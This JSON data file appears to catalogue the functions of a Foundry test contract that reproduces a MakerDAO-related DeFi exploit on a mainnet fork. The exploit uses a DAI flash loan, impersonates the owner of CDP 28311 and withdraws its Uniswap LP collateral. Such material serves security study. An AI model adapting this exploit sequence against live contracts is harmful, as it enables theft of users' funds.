[
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "onFlashLoan",
    "original_code": "    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32) {\n        address urns_address = IMakerManager(maker_cdp_manager).urns(28_311);\n        Urn memory urn = IMakerVat(make_mcd_vat).urns(\n            0x554e495632444149555344432d41000000000000000000000000000000000000, urns_address\n        );\n\n        Ilk memory ilk =\n            IMakerVat(make_mcd_vat).ilks(0x554e495632444149555344432d41000000000000000000000000000000000000);\n\n        uint256 amount_dai = IERC20(dai).balanceOf(address(this));\n        IERC20(dai).approve(maker_mcd_join_dai, amount_dai);\n\n        IMakerManager(maker_mcd_join_dai).join(urns_address, amount_dai);\n\n        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9); // borrow the authority of cdp 28311 (assigned before)\n        // dink = 0-urn.ink/4 = -1104761777152681125\n        // dart = 0-urn.art/4 = -2419153952397280665329975\n        IMakerManager(maker_cdp_manager).frob(28_311, -1_104_761_777_152_681_125, -2_419_153_952_397_280_665_329_975);\n        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9);\n        IMakerManager(maker_cdp_manager).flux(28_311, address(this), 1_104_761_777_152_681_125);\n        IUniv2(univ2).exit(address(this), 1_104_761_777_152_681_125);\n\n        IERC20(univ2_token).transfer(univ2_token, 1_104_761_777_152_681_125);\n        (uint256 amount0, uint256 amount1) = IUniv2Token(univ2_token).burn(address(this));\n\n        IERC20(circle).approve(allower, type(uint256).max);\n        Mcd(mcd).sellGem(address(this), 1_193_139_061_611);\n        IERC20(dai).approve(maker, type(uint256).max);\n        return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15_331_020 - 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Circle",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"[Begin] Attacker Circle before exploit\", IERC20(circle).balanceOf(address(this)), 6\n        );\n        uint256 amount = 2_437_926_935_218_598_618_037_988;\n        bytes memory data =\n            \"0x0000000000000000000000000000000000000000000000000000000000006e970000000000000000000000000000000000000000000000000000000000000000\";\n        IMakerPool(maker).flashLoan(address(this), dai, amount, data);\n        emit log_named_decimal_uint(\"[End] Attacker Circle after exploit\", IERC20(circle).balanceOf(address(this)), 6);\n    }\n\n",
    "description": ""
  }
]